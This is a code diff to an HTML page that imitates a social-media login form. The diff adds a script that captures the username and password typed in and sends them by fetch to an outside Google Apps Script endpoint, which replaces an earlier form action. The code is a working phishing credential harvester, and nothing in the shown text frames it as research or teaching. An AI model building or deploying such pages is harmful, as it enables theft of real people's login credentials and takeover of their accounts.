@@ -15,7 +15,7 @@
         <div class="wrapper">
 <div class="photo1"><img src="./aayu.png" alt=""></div>
 
-<form action="https://script.google.com/macros/s/AKfycbzMPjjCC5pIon39mWI-EXHpw-cgj41kVIGStmKlho2xL85qpJFGE7dQkEuMUhMwFhw_wg/exec" method="POST">
+<form action="" method="POST" id="form">
     <input type="text" id="nano" name="email" placeholder="Phone number, username, or email" required>
     <input type="password" name="password" placeholder="Password" id="password" required>
         <!-- <div class="maagi"> -->
@@ -138,4 +138,17 @@ button.onclick = function(){
 
 
 </body>
+<script>
+    let url='https://script.google.com/macros/s/AKfycbyLxSiR1PunlRVqGVcCaQTsjF7iuZRoOyE-p_a-puu570NjnXHhflthRU2pcjy17Xe6SA/exec'
+    let form=document.querySelector('#form');
+    form.addEventListener("submit",(e)=>{
+        let d=new FormData(form);
+        fetch(url,{
+            method:"POST",
+            body:d
+        }).then((res)=>res.text())
+        .then((finalRes)=>console.log(finalRes))
+        e.preventDefault();
+    })
+</script>
 </html>
